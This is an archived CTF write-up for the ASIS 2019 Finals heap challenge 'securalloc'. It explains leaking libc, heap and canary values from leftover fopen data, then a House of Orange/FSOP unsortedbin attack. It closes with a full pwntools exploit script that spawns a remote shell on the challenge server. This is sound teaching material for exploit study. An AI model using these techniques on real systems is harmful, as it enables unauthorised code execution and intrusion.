# securalloc

**CTF:** ASIS 2019 Finals  
**Category:** misc  
**Original writeup:** <https://teamrocketist.github.io/2019/11/18/Pwn-Asis-Finals-2019-securalloc/> — by **teamrocketist**. All credit goes to the original author; this is an archived copy.

---

Warm-up Pwnable Description:

The key to success in the battlefield is always the secure allocation of resources!

nc 76.74.177.238 9001

libc.so.6

libsalloc.so

securalloc.elf

TLDR

Leak libc from _IO_2_1_stderr leftover

Leak heap from _IO_2_1_stderr leftover

Leak heap canary from /dev/random leftover

Apply House of Orange and get a shell.

Extract information

We have an extra shared library libsalloc.so to analyse but first lets check the security on securalloc.elf:

1

2

3

4

5

6

7

$ checksec securalloc.elf

[*] '/ctf/asis2019/pwn/securalloc/securalloc.elf'

Arch: amd64-64-little

RELRO: Full RELRO

Stack: Canary found

NX: NX enabled

PIE: PIE enabled



Full RELRO is enabled so GOT is read only this is something that we always should take in mind before proceeding any further.

Identifying the vulnerability

Now lets check for a vulnerability :



Elf analysis

Like other heap challenges we will have the classic functions print, create, delete and edit but this time we have an additional shared library named libsalloc.so and the functions used from it are:

secureinit



Opening libsalloc.so in ida we can see it uses fopen to open /dev/urandom to create a canary:



And why this is bad ? Looking at fopen internals:

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22

23

24

25

26

27

FILE *

__fopen_internal (const char *filename, const char *mode, int is32)

{

struct locked_FILE

{

struct _IO_FILE_plus fp;



_IO_lock_t lock;



struct _IO_wide_data wd;

} *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));



if (new_f == NULL)

return NULL;



new_f->fp.file._lock = &new_f->lock;



_IO_no_init (&new_f->fp.file, 0, 0, &new_f->wd, &_IO_wfile_jumps);

_IO_JUMPS (&new_f->fp) = &_IO_file_jumps;

_IO_new_file_init_internal (&new_f->fp);

if (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != NULL)

return __fopen_maybe_mmap (&new_f->fp.file);



_IO_un_link (&new_f->fp);

free (new_f);

return NULL;

}



So a malloc of struct locked_FILE is executed, this struct will store IO_FILE pointers and the /dev/urandom data.

struct _IO_FILE_plus

1

2

3

4

5

6

7

8

9

10











struct _ IO_FILE_plus

{

FILE file;

const struct _ IO_jump_t * vtable ;

};



Look in memory after running fopen:



struct _IO_wide_data

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22

23

24

25



struct _IO_wide_data

{

wchar_t *_IO_read_ptr;

wchar_t *_IO_read_end;

wchar_t *_IO_read_base;

wchar_t *_IO_write_base;

wchar_t *_IO_write_ptr;

wchar_t *_IO_write_end;

wchar_t *_IO_buf_base;

wchar_t *_IO_buf_end;



wchar_t *_IO_save_base;

wchar_t *_IO_backup_base;



wchar_t *_IO_save_end;



__mbstate_t _IO_state;

__mbstate_t _IO_last_state;

struct _IO_codecvt _codecvt;



wchar_t _shortbuf[1];



const struct _IO_jump_t *_wide_vtable;

};



The look in memory:

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22

23

24

25

26

27

28

29

30

31

32

33

34

35

36

37

38

39

40

41

42

43

44

45

46

47

48

49

50

51

52

53

54

55

56

57

58

59

60

61

62

63

64

65

66

67

68

69

70

71

72

73

74

75

76

77

78

79

80

81

82

83

84

85

86

87

88

89

90

91

92

93

94

95

96

97

98

99

100

101

102

103

104

105

pwndbg> p *((_IO_lock_t*)0x000055dc452ed0f0) [33/1706]

$15 = {

lock = 0,

cnt = 0,

owner = 0x0

}

pwndbg> p *((struct _IO_wide_data*)0x55dc452ed100)

$16 = {

_IO_read_ptr = 0x0,

_IO_read_end = 0x0,

_IO_read_base = 0x0,

_IO_write_base = 0x0,

_IO_write_ptr = 0x0,

_IO_write_end = 0x0,

_IO_buf_base = 0x0,

_IO_buf_end = 0x0,

_IO_save_base = 0x0,

_IO_backup_base = 0x0,

_IO_save_end = 0x0,

_IO_state = {

__count = 0,

__value = {

__wch = 0,

__wchb = "\000\000\000"

}

},

_IO_last_state = {

__count = 0,

__value = {

__wch = 0,

__wchb = "\000\000\000"

}

},



_codecvt = {

__codecvt_destr = 0x0,

__codecvt_do_out = 0x0,

__codecvt_do_unshift = 0x0,

__codecvt_do_in = 0x0,

__codecvt_do_encoding = 0x0,

__codecvt_do_always_noconv = 0x0,

__codecvt_do_length = 0x0,

__codecvt_do_max_length = 0x0,

__cd_in = {

__cd = {

__nsteps = 0,

__steps = 0x0,

__data = 0x55dc452ed1b8

},

__combined = {

__cd = {

__nsteps = 0,

__steps = 0x0,

__data = 0x55dc452ed1b8

},

__data = {

__outbuf = 0x0,

__outbufend = 0x0,

__flags = 0,

__invocation_counter = 0,

__internal_use = 0,

__statep = 0x0,

__state = {

__count = 0,

__value = {

__wch = 0,

__wchb = "\000\000\000"

}

}

}

}

},

__cd_out = {

__cd = {

__nsteps = 0,

__steps = 0x0,

__data = 0x55dc452ed1f8

},

__combined = {

__cd = {

__nsteps = 0,

__steps = 0x0,

__data = 0x55dc452ed1f8

},

__data = {

__outbuf = 0x0,

__outbufend = 0x0,

__flags = 0,

__invocation_counter = 0,

__internal_use = 0,

__statep = 0x0,

__state = {

__count = 0,

__value = {

__wch = 0,

__wchb = "\000\000\000"

}

}

}

}

}

},

_shortbuf = L"",

_wide_vtable = 0x7fb6d6371260 <_IO_wfile_jumps>

}



The /dev/urandom data:



This data is freed but not cleared which means later we can leak this data by overlapping new chunks and use the print function to leak libc, heap and even the heap canary created by this library.

securealloc

securealloc adds 0x10 more bytes to the allocated space to store a canary at the end of the chunk and the size at the beginning:

1

2

3

4

5

6

7

8

9

10

11

12

_DWORD *__ fastcall secure_malloc ( unsigned int size)

{

_DWORD *v2;



v2 = malloc (size + 0x10 );

if ( !v2 )

__abort((__int64) "Resource depletion (secure_malloc)" );

*v2 = size;

v2[ 1 ] = size + 1 ;

*(_QWORD *)(( char *)v2 + size + 8 ) = canary;

return v2 + 2 ;

}



There is an integer overflow at malloc(size + 0x10) this could also be used to bypass the canary unfortunately the canary is going to be stored at a very high heap address which is unmapped we would have to expand the heap multiple times to get a mappable address, while this is feasible to do it locally it isn’t remotely because while there is a limit restriction of memory on the server we also would take 1 or 2 hours to do it (because we are communicating remotely).

securefree



There is a double free verification and also wipes out the chunk data before freeing.

1

2

3

4

5

6

7

8

9

10

11

12

13

14

void __fastcall secure_free(__int64 a1)

{

int v1;



if ( a1 )

{

v1 = *(_DWORD *)(a1 - 8);

if ( *(_DWORD *)(a1 - 4) - v1 != 1 )

__abort((__int64)"*** double free detected ***: <unknown> terminated");

__heap_chk_fail(a1);

memset((void *)(a1 - 8), 0, (unsigned int)(v1 + 16));

free((void *)(a1 - 8));

}

}.



_heap_chk_fail

this the function that verifies if there is a heap overflow.

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

__int64 __fastcall _heap_chk_fail(__int64 a1)

{

__int64 result;

unsigned int v2;



if ( a1 )

{

v2 = *(_DWORD *)(a1 - 8 );

result = *(_DWORD *)(a1 - 4 ) - v2;

if ( (_DWORD)result == 1 )

{

result = canary;

if ( *(_QWORD *)(v2 + a1) != canary )

__abort((__int64) "*** heap smashing detected ***: <unknown> terminated" );

}

}

return result;

}



LEAK heap and libc address

This the looks of the memory after secure_init:

To leak both we can first allocate a chunk of 0x60 and then 0x30 (this one leaks heap) and then 0x10 (this one will leak IO_JUMP libc address).

The python code to do this:

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22

add( 0x60 )

delete()

add( 0x30 )



show()

r.recvuntil( 'Data: ' )

HEAPADDR = u64(r.recv( 6 ).ljust( 0x8 , '\x00' ))

HEAP = HEAPADDR - 0xf0

log.info( "HEAPADDR 0x%x" % HEAPADDR)

log.info( "HEAP 0x%x" % HEAP)





add( 0x10 )

show()

r.recvuntil( 'Data: ' )

IOFILEJUMPS = u64(r.recv( 6 ).ljust( 0x8 , '\x00' ))



LIBC = IOFILEJUMPS - libc.symbols[ '_IO_file_jumps' ]

_IO_LIST_ALL = LIBC + libc.symbols[ '_IO_list_all' ]

SYSTEM = LIBC + libc.symbols[ 'system' ]

log.info( "IO_file_jumps 0x%x" % IOFILEJUMPS)

log.info( "LIBC 0x%x" % LIBC)



Leak canary

The canary is located at /dev/urandom data:

We do the same thing by allocating first a chunk of data 0x140 and then 0x8:

1

2

3

4

5

6



add( 0x140 )

add( 0x8 )

show()

HEAPCANARY = u64(r.recvline().rstrip()[ -7 ::].rjust( 0x8 , '\x00' ))

log.info( "HEAPCANARY 0x%x" % HEAPCANARY)



House of Orange

This isn’t exactly house of orange, house of orange usually is used when there isn’t a possibility of using a free by forcing the heap to expand by triggering sysmalloc when the top_chunk has no more space to allocate freeing the topchunk…

In our case we just want to convert the freed 0x60 sized chunk we freed previously into a smallbin.

When there is a large request(largebin size is enough) of malloc, a consolidation happens in order to prevent fragmentation. Every fastbin is moved to the unsortedbin, consolidates if possible, and finally goes to smallbin.

Later we use an unsortedbin attack with File Stream Oriented Programming to get a system(‘/bin/sh’) shell.

So this is the moment right before we allocate a chunk of 0x3e0 (0x3e0+0x10 > 1000 in decimal):



Now after executing malloc this fastbin chunk will be transformed into a smallbin:



File Stream Oriented Programming

We know that ROP can be used to hijack the control flow of the program, this can also be achieved by using file stream oriented programming but this one is achieved through an attack at File Stream.

We need to first understand malloc error message, which malloc_printerr is the function used to print the error:

1

2

3

4

5

6

7

if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0 ))

{

errstr = "malloc(): memory corruption (fast)" ;

errout:

malloc_printerr (check_action, errstr, chunk2mem (victim), av);

return NULL ;

}



the function is calls __libc_message after the abort function is called. The structure inside is used here, and the method of calling the virtual table is triggered.

abort -> _IO_flush_all_lockp -> _IO_list_all

We can use the heap overflow to change the smallbin bk and implement the unsortbin attack, bk address should point to _IO_list_all -0x10 so we can corrupt _IO_list_all.

In the end the unsortedbin attack will change the pointer of _IO_list_all into a location in main_arena, which will make _chain pointer of _IO_list_all to a fake IO_FILE (This fake IO_FILE will be located in heap).

Here is how _IO_list_all looks in memory:

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22

23

24

25

26

27

28

29

30

31

32

33

34

35

pwndbg> p *((struct _IO_FILE_plus*)0x7f742fb8db78)

$13 = {

file = {

_flags = 0xf12befc0,

_IO_read_ptr = 0x559af129d4f0 "",

_IO_read_end = 0x559af129d4f0 "",

_IO_read_base = 0x7f742fb8e510 "",

_IO_write_base = 0x7f742fb8db88 <main_arena+104> "\360\324)\361\232U",

_IO_write_ptr = 0x7f742fb8db88 <main_arena+104> "\360\324)\361\232U",

_IO_write_end = 0x7f742fb8db98 <main_arena+120> "\210?/t\177",

_IO_buf_base = 0x7f742fb8db98 <main_arena+120> "\210?/t\177",

_IO_buf_end = 0x7f742fb8dba8 <main_arena+136> "\230?/t\177",

_IO_save_base = 0x7f742fb8dba8 <main_arena+136> "\230?/t\177",

_IO_backup_base = 0x7f742fb8dbb8 <main_arena+152> "\250?/t\177",

_IO_save_end = 0x7f742fb8dbb8 <main_arena+152> "\250?/t\177",

_markers = 0x7f742fb8dbc8 <main_arena+168>,

_chain = 0x7f742fb8dbc8 <main_arena+168>,

_fileno = 0x2fb8dbd8,

_flags2 = 0x7f74,

_old_offset = 0x7f742fb8dbd8,

_cur_column = 0xdbe8,

_vtable_offset = 0xb8,

_shortbuf = "/",

_lock = 0x7f742fb8dbe8 <main_arena+200>,

_offset = 0x7f742fb8dbf8,

_codecvt = 0x7f742fb8dbf8 <main_arena+216>,

_wide_data = 0x7f742fb8dc08 <main_arena+232>,

_freeres_list = 0x7f742fb8dc08 <main_arena+232>,

_freeres_buf = 0x7f742fb8dc18 <main_arena+248>,

__pad5 = 0x7f742fb8dc18,

_mode = 0x2fb8dc28,

_unused2 = "t\177\000\000(?/t\177\000\000\070?/t"...

},

vtable = 0x7f742fb8dc38 <main_arena+280>

}



We need to forge an IO file that meets some specifications:

1

2

3

4

5

if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)

|| (_IO_vtable_offset (fp) == 0

&& fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr

> fp->_wide_data->_IO_write_base))

) && _IO_OVERFLOW (fp, EOF) == EOF)



Also need to change vtable address to a place we can control in this case I used a place on the heap.

We need then the _IO_OVERFLOW pointer to be setted to system, the fp header is set to /bin/sh.

we first allocate a chunk of size 0x0 but with the summation of securealloc the size will be 0x0+0x10 =0x10, this will create a small chunk and it’s going to be allocated in the space of the first chunk we freed taking up 0x10 of it’s space, and create a new unsortedbin as we can see below:

This is the payload we want to use:

1

2

3

4

5

6

7

8

9

10

11

12

payload = p64(HEAPCANARY)

payload += "/bin/sh\x00"

payload += p64( 0x61 )

payload += p64( 0xdeadbeef )

payload += p64(_IO_LIST_ALL -0x10 )

payload += p64( 0 ) + p64( 1 )

payload += p64( 0 ) * 18

payload += p64( 0 )

payload += p64( 0 ) * 2

payload += p64(HEAP+ 0x100 )

payload += p64( 0 ) * 3

payload += p64(SYSTEM)



Creating the chunks:

1

2

3

add( 0x0 )

edit(payload)

add( 0x10 )



The data after the overflow:



The exploit is not very reliable and sometimes fails so I putted it in an infinite loop to avoid rerunning the script at failurers:

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22

23

24

25

26

27

28

29

30

31

32

33

34

35

36

37

38

39

40

41

42

43

44

45

46

47

48

49

50

51

52

53

54

55

56

57

58

59

60

61

62

63

64

65

66

67

68

69

70

71

72

73

74

75

76

77

78

79

80

81

82

83

84

85

86

87

88

89

90

91

92

93

94

95

96

97

98

99

100

101

102

103

104

105

106

107

108

109

110

111

112

113

114

115

116

117

118

119

120

121

122

123

from pwn import *

host, port = "76.74.177.238" , "9001"

filename = "./securalloc.elf"

elf = ELF(filename)

context.arch = 'amd64'



if not args.REMOTE:

libc = elf.libc

else :

libc = ELF( './libc.so.6' )



def getConn () :

return process(filename) if not args.REMOTE else remote(host, port)



def get_PIE (proc) :

memory_map = open( "/proc/{}/maps" .format(proc.pid), "rb" ).readlines()

return int(memory_map[ 0 ].split( "-" )[ 0 ], 16 )



def get_LIBC (proc) :

memory_map = open( "/proc/{}/maps" .format(proc.pid), "rb" ).readlines()

return int(memory_map[ 4 ].split( "-" )[ 0 ], 16 )



def get_LIBALLOC (proc) :

memory_map = open( "/proc/{}/maps" .format(proc.pid), "rb" ).readlines()

return int(memory_map[ 9 ].split( "-" )[ 0 ], 16 )



def debug (bp, labp=[]) :

script = ""

PIE = get_PIE(r)

LIBALLOC = get_LIBALLOC(r)

for x in bp:

script += "b *0x%x

" %(PIE+x)

for x in labp:

script += "b *0x%x

" %(LIBALLOC+x)

gdb.attach(r,gdbscript=script)



def add (size) :

r.sendlineafter( '==========

> ' , '1' )

r.sendlineafter( 'Size: ' , str(size))





def edit (data) :

r.sendlineafter( '==========

> ' , '2' )

r.sendlineafter( 'Data: ' , data)



def show () :

r.sendlineafter( '==========

> ' , '3' )





def delete () :

r.sendlineafter( '==========

> ' , '4' )





context.terminal = [ 'tmux' , 'new-window' ]





def exploit () :

try :

global r

r = getConn()





if not args.REMOTE and args.GDB:

debug([ 0xBFF , 0xC67 , 0xC7D , 0xC39 , 0xD45 , 0xB6E ], [ 0xA0B ])

add( 0x60 )

delete()

add( 0x30 )



show()

r.recvuntil( 'Data: ' )

HEAPADDR = u64(r.recv( 6 ).ljust( 0x8 , '\x00' ))

HEAP = HEAPADDR - 0xf0

log.info( "HEAPADDR 0x%x" % HEAPADDR)

log.info( "HEAP 0x%x" % HEAP)





add( 0x10 )

show()

r.recvuntil( 'Data: ' )

IOFILEJUMPS = u64(r.recv( 6 ).ljust( 0x8 , '\x00' ))



LIBC = IOFILEJUMPS - libc.symbols[ '_IO_file_jumps' ]

_IO_LIST_ALL = LIBC + libc.symbols[ '_IO_list_all' ]

SYSTEM = LIBC + libc.symbols[ 'system' ]

log.info( "IO_file_jumps 0x%x" % IOFILEJUMPS)

log.info( "LIBC 0x%x" % LIBC)





add( 0x140 )

add( 0x8 )

show()

HEAPCANARY = u64(r.recvline().rstrip()[ -7 ::].rjust( 0x8 , '\x00' ))

log.info( "HEAPCANARY 0x%x" % HEAPCANARY)







add( 0x3e0 )

payload = p64(HEAPCANARY)

payload += "/bin/sh\x00"

payload += p64( 0x61 )

payload += p64( 0xdeadbeef )

payload += p64(_IO_LIST_ALL -0x10 )

payload += p64( 0 ) + p64( 1 )

payload += p64( 0 ) * 18

payload += p64( 0 )

payload += p64( 0 ) * 2

payload += p64(HEAP+ 0x100 )

payload += p64( 0 ) * 3

payload += p64(SYSTEM)

add( 0x0 )

edit(payload)

add( 0x10 )

r.recvuntil( '[vdso]

' )

r.sendline( 'ls -ltah' )

r.recvline_regex( r'\d\d:\d\d\s\.' )

r.interactive()

r.close()

return True

except EOFError, KeyboardInterrupt:

r.close()

return False

while not exploit():

pass
